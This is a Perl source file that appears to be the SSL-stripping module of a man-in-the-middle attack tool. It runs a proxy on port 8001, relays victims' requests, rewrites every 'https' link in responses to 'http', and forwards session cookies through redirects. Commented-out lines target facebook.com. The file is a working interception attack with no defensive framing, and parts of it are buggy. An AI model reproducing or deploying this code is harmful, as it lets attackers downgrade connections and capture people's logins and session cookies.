


sub Start_HTTP_Striping_Server_Thread {
	my $ua = LWP::UserAgent->new(keep_alive => 5, requests_redirectable => []);
	my $http = HTTP::Daemon->new( 
		LocalPort => 8001, 
		reuse => 1
	) || die;
	AddLogInfo("SITM SSLStripping Module started on port 8001\n");

	fork(); fork(); fork();fork();fork(); fork(); fork();fork();

	while (my $c = $http->accept) {
        while (my $request = $c->get_request) {
        	$request->uri("http://".$request->header("Host").$request->uri);
			#my $tmp_http = $request;
			#my $encoding_http;
			#($tmp_http, $encoding_http) = decode_content($tmp_http);
			#$tmp_http = replace_http($tmp_http);
			#$tmp_http->encode($encoding_http);
			#$request = $tmp_http;
			#print "REQUETE TRANSFORME\n\n".$tmp_http->as_string."\n\n";

			RESEND:
			@{ $ua->requests_redirectable } = ();
			my $response = $ua->request( $request );

			CHECK_CODE:
			

				my $tmp = $response;
				my $encoding;
				my $send;
				($tmp, $encoding) = decode_content($tmp);
				$tmp = replace_https($tmp, $response);
				$send = pack_response($tmp, $response, $encoding);

				$c->send_response($send);
			
		}
		$c->close;
		undef($c);	
	}

}


sub decode_content{
	my ($tmp) = @_;
	my $encoding = $tmp->header("Content-Encoding");			
	$tmp->decode;
	return ($tmp, $encoding);
}
				

sub replace_https{
	my ($tmp, $response) = @_;
	if(${$tmp->content_ref} =~ /(((https:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-]*)?\??(?:[\-\+=&;%@\.\w]*)#?(?:[\.\!\/\\\w]*))?)/g){
		${$tmp->content_ref} =~ s/https/http/g;
	}
	return $tmp;
}

sub replace_http{
	my ($tmp_http) = @_;
	if(${$tmp_http->content_ref} =~ /(((http:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-]*)?\??(?:[\-\+=&;%@\.\w]*)#?(?:[\.\!\/\\\w]*))?)/g){
		${$tmp_http->content_ref} =~ s/http/https/g;
	}
	return $tmp_http;
}

sub pack_response{

	my ($tmp, $response, $encoding) = @_;
	my $header = $response->headers;
	if($header->as_string =~ /\n/){
		my $tmp_header = $header->as_string;
		$tmp_header =~ s/\n/\r\n/g;
	}

	$tmp->encode($encoding);

	if(!$response->status_line){
		$response->status_line = "200 OK";
	}
	my $send = $response->status_line."\r\n";
	$send .= $header->as_string;
	$send .= "\r\n". $tmp->content;

	return $send;
}


sub redirect_301 {
	my ($request, $response) = @_;
	$request->uri("");
	$request->uri($response->header("Location"));

	my $cookie = $response->header("Set-Cookie");
	$request->push_header(Cookie => $cookie);

	if($response->header("Referer")){
		my $referer = $response->header("Referer");
		$request->header(Referer => $referer);	
	}	

	if($response = $ua->request( $request )){
	}
	return $response;
}

sub redirect_302{
	my ($request, $response) = @_;
	$request->uri($response->header("Location"));
	my $cookie = $response->header("Set-Cookie");
	$request->push_header(Cookie => $cookie);

	#if($response->header("Referer")){
		#my $referer = "https://facebook.com";#$response->header("Referer");#"https://facebook.com";#
		#$request->header(Referer => $referer);
		#print "REFERER : $referer\n";
	#}
		#if($referer =~ /http:/){
		#	$referer =~ s/http/https/;
		#}
		#print "REFERER : $referer\n";
	#	$request->header(Referer => $referer);			
	#}
	
	if($response = $ua->request( $request )){
	}
	return $response;
}

return 1;